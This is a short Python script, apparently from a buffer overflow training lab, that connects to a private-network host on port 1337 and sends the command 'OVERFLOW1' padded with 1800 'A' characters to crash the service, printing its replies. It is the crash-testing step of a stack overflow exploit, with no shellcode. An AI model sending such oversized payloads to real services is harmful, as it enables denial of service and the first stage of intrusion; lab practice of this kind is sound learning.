import socket
import sys

host, port = "10.10.165.208", 1337

command = "OVERFLOW1 "
payload = "".join(
    [
        command,
        "A" * 1800,
    ]
)
try:
    with socket.socket() as s:
        s.settimeout(1)
        s.connect((host, port))
        msg = s.recv(1024)
        if(msg):
            print(f'Connected: {msg}')
            print(f'Payload len: {len(payload)}: \n {payload}')
            s.send(bytes(payload, "latin-1"))
            msg2 = s.recv(1024)
            if(msg2):
                print(f'Server replied: {msg2}')

        print("Try successful.")
except:
    print("Try failed. Terminated")
    sys.exit(0)
